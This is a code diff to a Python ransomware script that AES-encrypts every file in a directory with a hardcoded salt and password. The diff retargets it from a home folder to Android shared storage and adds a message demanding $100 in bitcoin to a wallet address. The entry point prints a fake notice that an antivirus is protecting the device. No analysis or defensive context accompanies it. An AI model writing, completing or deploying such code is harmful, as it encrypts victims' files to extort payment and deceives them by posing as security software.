@@ -3,7 +3,7 @@ from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Util.Padding import pad, unpad
 
-TARGET_DIR = "/home/osint"
+TARGET_DIR = "/storage/emulated/0/"
 SALT = b'rans0m_salt_!@#$'  
 PASSWORD = "you_cant_find_it_madd"  
 
@@ -41,6 +41,7 @@ def process_directory():
                 if full_path == os.path.abspath(__file__):
                     continue
                 encrypt_file(full_path, key)
+                print("if you unlock you device sent 100$ bitcone to this Bitcoin ID is :bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq")
 
 if __name__ == "__main__":
     print("⚠️ WARNING: This Antivirus is protecting your device .")
